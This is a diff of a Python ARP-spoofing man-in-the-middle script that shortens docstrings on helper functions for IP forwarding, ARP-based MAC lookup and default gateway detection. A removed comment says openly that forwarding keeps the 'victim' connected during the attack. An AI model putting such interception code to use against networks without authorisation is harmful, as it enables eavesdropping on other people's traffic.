@@ -8,10 +8,7 @@ import socket
 import struct
 
 def enable_ip_forwarding():
-    """
-    Enables IP forwarding on the local machine to allow packets to flow through.
-    This is essential for a Man-in-the-Middle attack so the victim doesn't lose connectivity.
-    """
+    """Enable IP forwarding to maintain victim connectivity."""
     try:
         with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
             if f.read().strip() == "1":
@@ -26,9 +23,7 @@ def enable_ip_forwarding():
         print(f"[!] WARNING: Could not enable IP forwarding: {e}")
 
 def get_mac(ip):
-    """
-    Resolves the MAC address for a given IP address using an ARP request.
-    """
+    """Resolve MAC address for given IP using ARP."""
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
@@ -41,10 +36,7 @@ def get_mac(ip):
     return None
 
 def get_default_gateway():
-    """
-    Attempts to detect the default gateway of the system.
-    Tries Scapy first, then falls back to reading /proc/net/route.
-    """
+    """Detect default gateway IP address."""
     print("Attempting to detect default gateway...")
     
     # method 1: Scapy
